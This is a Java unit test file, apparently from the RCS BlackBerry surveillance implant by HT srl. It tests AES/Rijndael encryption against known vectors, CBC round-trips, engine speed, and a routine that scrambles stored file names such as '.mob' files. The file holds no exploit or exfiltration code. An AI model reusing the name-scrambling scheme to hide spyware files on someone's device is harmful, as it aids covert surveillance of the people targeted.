//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : tests.unit
 * File         : UT_Crypto.java
 * Created      : 28-apr-2010
 * *************************************************/
package tests.unit;
import java.util.Date;

import net.rim.device.api.crypto.AESDecryptorEngine;
import net.rim.device.api.crypto.AESEncryptorEngine;
import net.rim.device.api.crypto.AESKey;
import net.rim.device.api.crypto.CryptoException;
import net.rim.device.api.crypto.CryptoTokenException;
import net.rim.device.api.crypto.CryptoUnsupportedOperationException;
import net.rim.device.api.util.Arrays;
import tests.AssertException;
import tests.TestUnit;
import tests.Tests;
import blackberry.crypto.CryptoEngine;
import blackberry.crypto.Encryption;
import blackberry.crypto.Rijndael;
import blackberry.crypto.RimAES;
import blackberry.utils.Check;
import blackberry.utils.Utils;


/**
 * The Class UT_Crypto.
 */
public final class UT_Crypto extends TestUnit {

    /**
     * Instantiates a new u t_ crypto.
     * 
     * @param name
     *            the name
     * @param tests
     *            the tests
     */
    public UT_Crypto(final String name, final Tests tests) {
        super(name, tests);
    }

    /**
     * CBC test.
     * 
     * @return true, if successful
     * @throws AssertException
     *             the assert exception
     * @throws CryptoException 
     */
    boolean CBCTest() throws AssertException, CryptoException {
        //#ifdef DEBUG
        debug.info("-- CBCTest --");
        //#endif

        final Encryption enc = new Encryption();
        final byte[] key = new byte[] { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05,
                0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
        byte[] plain = new byte[] { 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66,
                0x77, (byte) 0x88, (byte) 0x99, (byte) 0xaa, (byte) 0xbb,
                (byte) 0xcc, (byte) 0xdd, (byte) 0xee, (byte) 0xff };
        final byte[] cyphered = new byte[] { 0x69, (byte) 0xc4, (byte) 0xe0,
                (byte) 0xd8, 0x6a, 0x7b, 0x04, 0x30, (byte) 0xd8, (byte) 0xcd,
                (byte) 0xb7, (byte) 0x80, 0x70, (byte) 0xb4, (byte) 0xc5, 0x5a };

        enc.makeKey(key);

        byte[] buffer = enc.encryptData(plain);
        AssertThat(Arrays.equals(buffer, cyphered), "Encryption encrypt");

        buffer = enc.decryptData(cyphered);
        AssertThat(Arrays.equals(buffer, plain), "Encryption decrypt");

        plain = new byte[1024];
        buffer = enc.encryptData(plain);
        AssertThat(!Arrays.equals(buffer, plain), "enc error");
        buffer = enc.decryptData(buffer);
        AssertThat(Arrays.equals(buffer, plain), "self error");

        return true;
    }

    /**
     * Encrypt test.
     * 
     * @return true, if successful
     * @throws AssertException
     *             the assert exception
     * @throws CryptoException 
     */
    boolean EncryptTest() throws AssertException, CryptoException {
        //#ifdef DEBUG
        debug.info("-- EncryptTest --");
        //#endif

        final Encryption enc = new Encryption();
        final byte[] key = new byte[] { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05,
                0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };

        enc.makeKey(key);

        // 1
        //#ifdef DEBUG
        debug.info("1");
        //#endif
        byte[] plain = new byte[1];
        Arrays.fill(plain, (byte) 0x0f);
        byte[] buffer = enc.encryptData(plain);
        AssertThat(!Arrays.equals(buffer, plain), "enc error");
        AssertThat(buffer.length == 16, "len error 1");

        buffer = enc.decryptData(buffer, 1, 0);
        AssertThat(buffer.length == 1, "len error 2");
        AssertThat(Arrays.equals(buffer, 0, plain, 0, plain.length),
                "self error");

        // 1
        //#ifdef DEBUG
        debug.info("12");
        //#endif
        plain = new byte[12];
        Arrays.fill(plain, (byte) 0x0f);
        buffer = enc.encryptData(plain);
        AssertThat(!Arrays.equals(buffer, plain), "enc error");
        AssertThat(buffer.length == 16, "len error 1");

        buffer = enc.decryptData(buffer, plain.length, 0);
        AssertThat(buffer.length == plain.length, "len error 2");
        AssertThat(Arrays.equals(buffer, 0, plain, 0, plain.length),
                "self error");

        // 1
        //#ifdef DEBUG
        debug.info("16");
        //#endif
        plain = new byte[16];
        Arrays.fill(plain, (byte) 0x0f);
        buffer = enc.encryptData(plain);
        AssertThat(!Arrays.equals(buffer, plain), "enc error");
        AssertThat(buffer.length == 16, "len error 1");

        buffer = enc.decryptData(buffer, plain.length, 0);
        AssertThat(buffer.length == 16, "len error 2");
        AssertThat(Arrays.equals(buffer, 0, plain, 0, plain.length),
                "self error");
        
        // 1
        //#ifdef DEBUG
        debug.info("32");
        //#endif
        plain = new byte[32];
        Arrays.fill(plain, (byte) 0x0f);
        buffer = enc.encryptData(plain);
        AssertThat(!Arrays.equals(buffer, plain), "enc error");
        AssertThat(buffer.length == plain.length, "len error 1");

        //#ifdef DEBUG
        debug.trace("EncryptTest plain : " + Utils.byteArrayToHex(plain));
        debug.trace("EncryptTest cypher: " + Utils.byteArrayToHex(buffer));
        //#endif
        
        buffer = enc.decryptData(buffer, plain.length, 0);
        AssertThat(buffer.length == plain.length, "len error 2");
        AssertThat(Arrays.equals(buffer, 0, plain, 0, plain.length),
                "self error");

        // 1024
        //#ifdef DEBUG
        debug.info("1024");
        //#endif
        plain = new byte[1024];
        Arrays.fill(plain, (byte) 0x0f);
        buffer = enc.encryptData(plain);
        AssertThat(!Arrays.equals(buffer, plain), "enc error");
        AssertThat(buffer.length == plain.length, "len error 1");

        buffer = enc.decryptData(buffer, plain.length, 0);
        AssertThat(buffer.length == plain.length, "len error 2");
        AssertThat(Arrays.equals(buffer, 0, plain, 0, plain.length),
                "self error");

        return true;
    }

    /**
     * Multiple test.
     */
    void MultipleTest() {
        for (int i = 0; i < 1024; i++) {
            final int n = Encryption.getNextMultiple(i);
            //#ifdef DBC
            Check.asserts(n >= 0, "Wrong n");
            //#endif
        }
    }

    /**
     * Verifica che la classe Rijndael sia conforme alle specifiche dichiarate,
     * testando una encryption e una decryption con dei valori noti.
     * 
     * @return true, if successful
     * @throws AssertException
     *             the assert exception
     */
    boolean RijndaelTest() throws AssertException {
        //#ifdef DEBUG
        debug.info("-- RijndaelTest --");
        //#endif
        final Rijndael crypto = new Rijndael();

        // i valori seguenti sono stati presi dal paper che descriveva il
        // rijandael per aes
        final byte[] key = new byte[] { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05,
                0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
        final byte[] plain = new byte[] { 0x00, 0x11, 0x22, 0x33, 0x44, 0x55,
                0x66, 0x77, (byte) 0x88, (byte) 0x99, (byte) 0xaa, (byte) 0xbb,
                (byte) 0xcc, (byte) 0xdd, (byte) 0xee, (byte) 0xff };
        final byte[] cyphered = new byte[] { 0x69, (byte) 0xc4, (byte) 0xe0,
                (byte) 0xd8, 0x6a, 0x7b, 0x04, 0x30, (byte) 0xd8, (byte) 0xcd,
                (byte) 0xb7, (byte) 0x80, 0x70, (byte) 0xb4, (byte) 0xc5, 0x5a };

        // generazione delle chiave
        crypto.makeKey(key, 128);

        // cifratura
        final byte[] buffer = new byte[16];
        crypto.encrypt(plain, buffer);

        // verifico che la cifratura sia conforme a quanto atteso
        AssertThat(Arrays.equals(buffer, cyphered), "Rijndael encrypt");

        // decifro
        crypto.decrypt(cyphered, buffer);

        // verifico che la decifratura sia conforme a quanto atteso
        AssertThat(Arrays.equals(buffer, plain), "Rijndael decrypt");

        // se arrivo qui e- perche- le assert non sono fallite, quindi
        // restituisco true
        return true;

    }

    /*
     * (non-Javadoc)
     * @see tests.TestUnit#run()
     */
    public boolean run() throws AssertException {
        MultipleTest();
        RijndaelTest();
        try {
            CBCTest();
            EncryptTest();
        } catch (CryptoException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
            throw new AssertException();
        }
        
        ScrambleTest();
        SpeedTest();

        return true;
    }

    /**
     * Scramble test.
     * 
     * @throws AssertException
     *             the assert exception
     */
    void ScrambleTest() throws AssertException {

        String ret = Encryption.encryptName("KiodoGay", 0xb0);
        String expected = "pKdTdlYz";
        AssertEqual(ret, expected, "Scramble 1");

        ret = Encryption.encryptName("BrunelloBrunilde", 0xb0);
        expected = "RbF5OQQdRbF5KQTO";
        AssertEqual(ret, expected, "Scramble 2");

        ret = Encryption.encryptName("Zeno", 0xb0);
        expected = "kO5d";
        AssertEqual(ret, expected, "Scramble 3");

        ret = Encryption.encryptName("Xeno", 0xb0);
        expected = "8O5d";
        AssertEqual(ret, expected, "Scramble 4");

        ret = Encryption.encryptName("10401349w298238402834923.mob", 0xb0);
        expected = "mVHVmoHh9ZhnZonHVZnoHhZo.udD";
        AssertEqual(ret, expected, "Scramble 5");

        ret = Encryption.encryptName("*.mob", 0xb0);
        expected = "*.udD";
        AssertEqual(ret, expected, "Scramble 6");

        //zepUU!DDDDUfWWDWZ44Bzz.MOB not scrambled: 23411!0000157707966b22.mob
        //ret = Encryption.encryptName("23411!0000157707966b22.mob", (byte) 0xb0);
        //expected = "zepUU!DDDDUfWWDWZ44Bzz.MOB";
        //AssertEqual(ret, expected, "Scramble 7");
    }

    private void SpeedTest() throws AssertException {

        // i valori seguenti sono stati presi dal paper che descriveva il
        // rijandael per aes
        final byte[] key = new byte[] { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05,
                0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
        final byte[] plain = new byte[] { 0x00, 0x11, 0x22, 0x33, 0x44, 0x55,
                0x66, 0x77, (byte) 0x88, (byte) 0x99, (byte) 0xaa, (byte) 0xbb,
                (byte) 0xcc, (byte) 0xdd, (byte) 0xee, (byte) 0xff };
        final byte[] cyphered = new byte[] { 0x69, (byte) 0xc4, (byte) 0xe0,
                (byte) 0xd8, 0x6a, 0x7b, 0x04, 0x30, (byte) 0xd8, (byte) 0xcd,
                (byte) 0xb7, (byte) 0x80, 0x70, (byte) 0xb4, (byte) 0xc5, 0x5a };

        // ALGO java
        CryptoEngine crypto = new Rijndael();
        // generazione delle chiave
        crypto.makeKey(key, 128);
        byte[] buffer = new byte[16];

        Date before = new Date();

        for (int i = 0; i < 10000; i++) {
            try {
                // cifratura
                crypto.encrypt(plain, buffer);
                // decifro
                crypto.decrypt(cyphered, buffer);
            } catch (final CryptoTokenException e) {
                // TODO Auto-generated catch block
                throw new AssertException();
            }

        }

        AssertThat(Arrays.equals(buffer, plain), "Encryption decrypt");

        Date after = new Date();
        final long elapsed_1 = Utils.dateDiff(after, before);

        // ALGO RimAES
        crypto = new RimAES();
        // generazione delle chiave
        crypto.makeKey(key, 128);
        buffer = new byte[16];

        before = new Date();
        for (int i = 0; i < 10000; i++) {
            try {
                // cifratura
                crypto.encrypt(plain, buffer);
                // decifro
                crypto.decrypt(cyphered, buffer);
            } catch (final CryptoTokenException e) {
                // TODO Auto-generated catch block
                throw new AssertException();
            }
        }
        AssertThat(Arrays.equals(buffer, plain), "Encryption decrypt");

        after = new Date();
        final long elapsed_2 = Utils.dateDiff(after, before);

        // ALGO rim
        final AESKey aeskey = new AESKey(key, 0, 128);
        AESEncryptorEngine aesencrypt;
        AESDecryptorEngine aesdecrypt;
        try {
            aesencrypt = new AESEncryptorEngine(aeskey);
            aesdecrypt = new AESDecryptorEngine(aeskey);

        } catch (final CryptoTokenException e) {
            throw new AssertException();
        } catch (final CryptoUnsupportedOperationException e) {
            throw new AssertException();
        }

        before = new Date();
        for (int i = 0; i < 10000; i++) {
            try {
                // cifratura
                aesencrypt.encrypt(plain, 0, buffer, 0);
                // decifratura
                aesdecrypt.decrypt(cyphered, 0, buffer, 0);
            } catch (final CryptoTokenException e) {
                throw new AssertException();
            }
        }

        AssertThat(Arrays.equals(buffer, plain), "Encryption decrypt");

        after = new Date();
        final long elapsed_3 = Utils.dateDiff(after, before);

        //#ifdef DEBUG
        debug.info("JAVA    1: " + elapsed_1);
        debug.info("RIMWRAP 2: " + elapsed_2);
        debug.info("RIM     3: " + elapsed_3);
        debug.trace("end test");
        //#endif

    }

}
